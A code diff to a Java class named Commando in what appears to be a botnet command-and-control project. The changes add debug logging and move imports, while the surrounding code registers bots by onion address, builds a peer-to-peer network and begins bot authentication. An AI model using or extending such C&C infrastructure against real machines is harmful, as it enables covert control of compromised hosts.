@@ -17,13 +17,14 @@ import javax.crypto.BadPaddingException;
 import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 
+import cs.sii.service.html.LogUtils;
 import org.jgrapht.UndirectedGraph;
 import org.jgrapht.graph.DefaultEdge;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Service;
 
-import cs.sii.bot.action.Auth;
+import cs.sii.service.crypto.Auth;
 import cs.sii.domain.OnionAddress;
 import cs.sii.domain.Pairs;
 import cs.sii.domain.SyncIpList;
@@ -33,7 +34,7 @@ import cs.sii.model.user.User;
 import cs.sii.network.request.BotRequest;
 import cs.sii.network.request.CecRequest;
 import cs.sii.service.connection.NetworkService;
-import cs.sii.service.connection.P2PMan;
+import cs.sii.service.graph.P2PMan;
 import cs.sii.service.crypto.CryptoPKI;
 import cs.sii.service.crypto.CryptoUtils;
 import cs.sii.service.dao.BotServiceImpl;
@@ -73,6 +74,8 @@ public class Commando {
 	@Autowired
 	private CryptoUtils crypto;
 
+	@Autowired
+	private LogUtils logHtml;
 
 	
 	/**
@@ -86,13 +89,16 @@ public class Commando {
 	 * Metodo che inizializza le funzioni principali del C&C
 	 */
 	public void initializeCeC() {
-
+		System.out.println("INIZIALIZZAZIONE CEC MODE");
+		logHtml.appendTextDebug("INIZIALIZZAZIONE CEC MODE");
 		Pairs<OnionAddress, String> botAlive = new Pairs<OnionAddress, String>(nServ.getMyOnion(), nServ.getIdHash());
 		nServ.getAliveBot().add(botAlive);
 		//Inizializzazione rete P2P
+		System.out.println("Inizializzazione P2P");
+		logHtml.appendTextDebug("Inizializzazione P2P");
 		pServ.initP2P();
-		System.out.println("peer to peer fatto");
-
+		System.out.println("Rete p2p creata");
+		logHtml.appendTextDebug("Rete p2p creata");
 		//Aggiunta dei ruoli all'interno del DB
 		 Role admin=new Role("ADMIN");
 		 rServ.save(admin);
@@ -116,6 +122,7 @@ public class Commando {
 	 */
 	public Pairs<Long, Integer> authReq(String idBot) {
 		System.out.println("Inizio fase di autenticazione BotToCec");
+
 		Pairs<Long, Integer> response;
 		if (auth.getBotSeed().indexOfValue1(idBot) >= 0)
 			return auth.getBotSeed().getByValue1(idBot).getValue2();
